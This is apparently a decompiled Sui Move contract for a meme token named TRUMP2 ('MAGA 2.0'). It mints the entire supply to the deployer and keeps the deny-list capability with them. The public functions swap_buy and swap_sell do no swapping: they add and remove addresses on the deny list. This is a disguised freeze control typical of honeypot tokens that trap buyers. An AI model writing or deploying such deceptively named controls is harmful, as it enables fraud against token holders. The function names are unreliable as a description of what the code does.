module 0x4d1ada29e91f917f0b5a131e30c51b7a17a0002e75ee25a884fa7e92640c3250::trump2 {
    struct TRUMP2 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TRUMP2, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TRUMP2>(arg0, 9, b"TRUMP2", b"MAGA 2.0", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://gateway.irys.xyz/jfajBV6aV4XBcBvBY2VSxSvOmkNfLhUtwnyyzhWM2UI"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TRUMP2>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TRUMP2>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TRUMP2>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TRUMP2>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TRUMP2>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TRUMP2>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TRUMP2>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<TRUMP2>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

